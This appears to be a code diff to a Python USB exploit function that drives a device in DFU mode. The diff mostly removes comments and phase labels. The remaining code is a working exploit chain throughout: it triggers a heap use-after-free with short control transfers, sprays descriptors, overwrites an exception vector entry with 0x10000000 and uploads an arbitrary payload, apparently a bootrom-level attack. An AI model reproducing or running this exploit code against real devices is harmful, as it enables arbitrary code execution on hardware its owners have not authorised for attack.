@@ -252,11 +252,9 @@ def _exploit_and_upload(ctx: usb1.USBContext,
 
     blank = bytes(DFU_MAX_TRANSFER_SZ)
 
-    # -- Phase 1: trigger heap use-after-free via short USB transfer --
-    print("[*] Phase 1: heap setup")
     _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, blank, 100)
 
-    push    = 0x7C0   # target: trigger short-transfer at exactly this offset
+    push    = 0x7C0
     retries = 0
 
     while True:
@@ -268,7 +266,6 @@ def _exploit_and_upload(ctx: usb1.USBContext,
             print(f"[d]   async DNLOAD sent=0x{sent:x}")
 
         if sent >= push:
-            # Transfer completed without short-packet - retry
             retries += 1
             time.sleep(0.01)
             _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, bytes(EP0_MAX_PACKET_SZ), 100)
@@ -279,19 +276,16 @@ def _exploit_and_upload(ctx: usb1.USBContext,
         try:
             dev.ctrl(0x00, 0x00, 0x0000, 0x0000, bytes(size), 100)
         except usb1.USBError:
-            break   # EP0 stalled (USBErrorPipe) or other error - move on
+            break   # stalled - good
 
-        # Not stalled yet; keep trying
         retries += 1
         time.sleep(0.01)
         _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, bytes(EP0_MAX_PACKET_SZ), 100)
         time.sleep(0.01)
 
     if debug:
-        print(f"[d] Phase 1 done after {retries} retries")
+        print(f"[d] stall achieved after {retries} retries")
 
-    # -- Phase 2: corrupt the freed allocation via string-descriptor spray --
-    print("[*] Phase 2: heap spray")
     _ctrl_noerr(dev, 0x21, 1, 0x0000, 0x0000, b"", 100)          # zero-len DNLOAD
     _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)             # GET_STATUS
     _ctrl_noerr(dev, 0xA1, 3, 0x0000, 0x0000, 6, 100)             # GET_STATUS
@@ -302,7 +296,7 @@ def _exploit_and_upload(ctx: usb1.USBContext,
             cancel_after_ns=100,   # 100 ns
         )
         if debug:
-            print(f"[d]   spray sent=0x{sent:x}")
+            print(f"[d]   string desc sent=0x{sent:x}")
         timed_out = False
         try:
             dev.ctrl(0x80, 6, 0x0304, 0x040A, 64, 1)
@@ -312,34 +306,26 @@ def _exploit_and_upload(ctx: usb1.USBContext,
         if sent != 128 and timed_out:
             break
 
-    # Clear EP0 stall twice
+    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)   # CLEAR_FEATURE x2
     _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)
-    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)
-
-    # Trigger the overwrite by reading past the end of the descriptor
     _ctrl_noerr(dev, 0x80, 8, 0x0000, 0x0000, 129, 100)
 
     time.sleep(0.5)
 
-    # -- Reconnect after phase 2 --
-    print("[*] Reconnecting (post-phase-2)...")
+    print("[*] Reconnecting...")
     dev.reset_and_close()
     dev = wait_for_dfu(ctx, announce=False)
 
     time.sleep(0.1)
 
-    # -- Phase 3: overwrite exception vector then upload payload --
-    print("[*] Phase 3: vector overwrite + payload upload")
-
-    # Exception vector table entry [5] = 0x10000000 triggers exec
+    # entry [5] of the overwrite buffer = 0x10000000
     overwrite = bytearray(4 * 7)
     struct.pack_into("<I", overwrite, 5 * 4, 0x10000000)
 
-    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)   # CLEAR_FEATURE x2
+    _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)
     _ctrl_noerr(dev, 0x02, 3, 0x0000, 128, b"", 10)
     _ctrl_noerr(dev, 0x00, 0x00, 0x0000, 0x0000, bytes(overwrite), 100)
 
-    # Upload payload in DFU_MAX_TRANSFER_SZ chunks (DFU DNLOAD)
     offset = 0
     while offset < len(payload):
         chunk = payload[offset : offset + DFU_MAX_TRANSFER_SZ]
@@ -352,8 +338,7 @@ def _exploit_and_upload(ctx: usb1.USBContext,
 
     time.sleep(1.0)
 
-    # -- Final reconnect --
-    print("[*] Reconnecting (post-upload)...")
+    print("[*] Reconnecting...")
     dev.reset_and_close()
     return wait_for_dfu(ctx, announce=False)
 
